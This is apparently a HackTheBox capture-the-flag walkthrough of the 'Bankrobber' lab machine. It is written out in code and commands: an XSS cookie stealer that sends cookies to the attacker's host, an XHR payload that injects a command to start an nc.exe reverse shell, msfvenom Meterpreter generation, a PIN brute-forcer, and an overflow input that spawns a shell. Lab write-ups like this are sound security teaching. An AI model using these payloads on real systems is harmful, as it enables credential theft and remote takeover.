HackTheBox — Bankrobber (Walkthrough)

sinfulz
Mar 8 · 10 min read

Bankrobber was a fun & unique box made by Gio & Cneeliz.

The box included:

  • XSS
  • XHR
  • Scripting a brute-forcer
  • Exploiting a binary

Initial recon:

To begin, the box was port scanned using nmap:

nmap -sC -sV 10.10.10.154

A few ports were open, but port 80/443 was of interest.

After navigating to 10.10.10.154 an E-coin Login & Register page was presented to the user.

A user called test was created with the username & password as test.

The newly created test account was used to login to the web application.

Once logged in, a Transfer E-coin page was displayed at /user

A single E-coin was sent to ID 1 with a basic message as shown below:

A transfer hold message was displayed after hitting the TRANSFER E-COIN button:

After this, nothing really happened to the user. This was because an “admin” had to review it. It seemed likely that the attack vector was a client side attack, specifically a XSS attack (XSS is short for Cross-Site Scripting).

A simple cookie stealer POC was created and used:

<script>
new Image().src="http:/10.10.14.15:88/bogus.php?output="%2bdocument.cookie; 
</script>

bogus.php did not exist, but the “scripted” admin on the server end does not know this and will send the attacking user it’s cookies.

After the TRANSFER E-COIN button was pressed, a netcat listener was setup on port 88:

nc -lvp 88
listening on [any] 88 ...
10.10.10.154: inverse host lookup failed: Unknown host
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.154] 56028
GET /bogus.php?output=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1
Referer: http://localhost/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: nl-NL,en,*
Host: 10.10.14.15:88

As shown above, a hit was discovered on the netcat listener. It looked like session cookies.

The cookie was decoded in Burp Suite’s Decoder:

The captured username was admin.

The captured password was Hopelessromantic.

After logging out as the test user and logging in as admin, a new page was discovered upon login as admin:

Backdoorchecker looked interesting and the whoami command was used:

Unfortunately it did not work:

After attempting to run dir piping different commands such as dir | whoami it was determined another attack method should be used.

Since XSS was used to obtain admin’s login details, a more sophisticated attack could be used incorporating XHR. (XMLHttpRequest)

A weaponised XSS payload was created using XHR functionality:

<script> var x = new XMLHttpRequest(); x.open("POST", "backdoorchecker.php", true); x.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); x.send('cmd=dir asd || \\\\10.10.14.15\\a\\nc.exe -e cmd.exe 10.10.14.15 443');</script>

This payload was used in the first page discovered, the Transfer E-Coin page. It should be noted this page should be accessed by the test user, not the admin user.

The payload was placed in the comment box and the TRANSFER E-COIN button was again pressed:

It is worth noting that the TRANSFER E-COIN button may have to be pressed twice if no hit is received on the smbserver.

An smbserver was setup to capture the bankrobber.exe binary:

python /usr/share/doc/python-impacket/examples/smbserver.py a .

A netcat listener was setup to catch the reverse shell:

It is always best to try and obtain a Meterpreter reverse shell rather than a standard reverse shell as Meterpreter has more functionality and can be easier to do certain things.

msfvenom was used to create a reverse Meterpreter shell:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f exe -o bankrobber.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: bankrobber.exe

While the smbserver was still open, bankrobber.exe (the Meterpreter reverse shell) was obtained and spawned on the Bankrobber machine:

\\10.10.14.15\a\bankrobber.exe

Metasploit was used to create a multi/handler listener:

After a minute or so a Meterpreter session was opened and the low privilege user was obtained.

Privilege Escalation:

The root directory of Bankrobber was checked for low hanging fruit, and to no surprise an interesting binary was found called bankv2.exe.

C:\>dir
dir

After not being able to execute bankv2.exe or do much with it, the next step was to check if there was any ports running internally related to bankv2.exe.

netstat -ano

Active ConnectionsProto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1792
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       1792
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1220

Out of the many ports discovered, an interesting port was found to be listening interally. Port 910 was port forwarded using Meterpreter’s easy to use portfwd command:

meterpreter > portfwd add -l 910 -p 910 -r 10.10.10.154
[*] Local TCP relay created: :910 <-> 10.10.10.154:910

The portfwd list command was used to see if the previous port forward command was successful:

meterpreter > portfwd list

Active Port Forwards
====================Index  Local        Remote            Direction
   -----  -----        ------            ---------
   1      0.0.0.0:910  10.10.10.154:910  Forward1 total active port forwards.

Since port 910 was now opened to our local Kali machine, netcat was used to connect to port 910:

nc 127.0.0.1 910
 --------------------------------------------------------------Trying 0000
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0000
 [!] Access denied, disconnecting client....

It looked like the application was locked behind a 4 digit pin, a random pin was used but it did not let us into the application.

A small bruteforcing script was created and used to obtain the password:

#!/usr/bin/env python3import socket
import re
import timehost = '127.0.0.1'
port = 910
search_term = "Access denied"
server_address = (host, port)for i in range(0,9999):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(server_address)
    data = s.recv(1024)
    sending_data = str(i).zfill(4)
    print("Trying PIN: "+ sending_data)
    s.sendall(sending_data.encode())
    data = s.recv(1024)
    string_data = data.decode('utf-8')
    if re.search(search_term, string_data, re.IGNORECASE):
       print("Wrong PIN")
    else:
       print("PIN is: " + str(i).zfill(4))
       break
    s.close()

The script stopped at 0021 so it was safe to assume that may have been the correct pin.

After using the password 0021, access was granted to the application.

nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:

By sending 1 e-coin the application doesn’t really seem to do anything except execute transfer.exe:

nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 1
 [$] Transfering $1 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe[$] Transaction in progress, you can safely disconnect...
^C

This time, more e-coins were transferred but the same result occurred. To abuse the application, more e-coins may need to be sent. It is worth noting when performing Buffer Overflows, it is always best to fuzz or test the application with A’s. A was used instead of 1 from this point forward:

nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe[$] Transaction in progress, you can safely disconnect...
^C

It was identified that abusing the input field can yield different results:

nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

The Executing e-coin transfer tool: section was rewritten with the below payload:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.

This could mean, by sending enough characters, the A’s can be rewritten to a include and spawn reverse shell.

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\10.10.14.15\a\nc.exe -e cmd.exe 10.10.14.15 443

The payload was used on the application:

nc 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System

 [$] Executing e-coin transfer tool: \\10.10.14.15\a\nc.exe -e cmd.exe 10.10.14.15 443[$] Transaction in progress, you can safely disconnect...

Root shell dance:

Finally the root flag could be read:

c:\Users\admin\Desktop>type root.txt
type root.txt
aa6<redacted>b197
